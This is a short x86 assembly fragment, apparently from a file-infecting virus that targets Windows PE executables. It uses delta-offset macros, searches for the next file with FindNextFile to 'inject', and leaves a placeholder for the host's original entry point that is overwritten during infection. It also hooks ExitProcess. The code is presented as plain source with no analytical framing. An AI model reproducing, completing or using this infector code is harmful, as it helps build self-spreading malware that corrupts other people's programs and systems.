; MANAGE ALL KINDS OF ERRORS !
errorInjecting:
PVDELTA	PeFileMap
call	[DELTA pUnmapViewOfFile]

errorMapFile:
PVDELTA	PeMapObject
call	[DELTA pCloseHandle]

errorCreateMapping:
PVDELTA	PeFile
call	[DELTA pCloseHandle]

; TO THIS POINT WE GET THE NEXT FILE (IF POSSIBLE)
errorOpen:
PDELTA	FileData
PVDELTA	HandleSearch
call	[DELTA pFindNextFile]
cmp	eax, 0
je	errorExit
jmp	nextFileToInject

; Wait for thread old program and exit
errorExit:
PVDELTA	ThreadId
push	INFINITE
call	[DELTA pWaitForSingleObject]
push	0
call	[DELTA pExitProcess]

; Jump to old entry point (Overrided when injecting)
threadProgram:
ret ; By default it exit our thread
nop
nop
nop
nop

hook_exitprocess:
pop	eax ; Remove push ExitProcess
pop	eax ; Remove return ExitProcess
ret	; Thread return
